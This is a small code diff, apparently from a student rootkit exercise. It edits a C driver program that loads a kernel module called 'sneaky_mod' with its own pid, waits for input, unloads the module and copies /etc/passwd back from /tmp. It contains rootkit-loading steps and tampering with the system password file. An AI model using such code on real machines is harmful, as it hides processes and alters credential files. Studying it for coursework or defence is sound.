@@ -12,7 +12,7 @@ int main(void){
 
   // 3. load sneaky module
   char message[50];
-  sprintf(message, "insmod sneaky_mod.ko pid=%d", (int)getpid());
+  sprintf(message, "insmod sneaky_mod.ko pid=%d", getpid());
   system(message);
 
   // 4. while loop
@@ -20,7 +20,7 @@ int main(void){
   while ((inputChar = getchar()) != 'q');
 
   // 5. unload sneaky module
-  system("rmmod sneaky_mod");
+  system("rmmod sneaky_mod.ko");
 
   // 6. resore password file
   system("cp /tmp/passwd /etc");
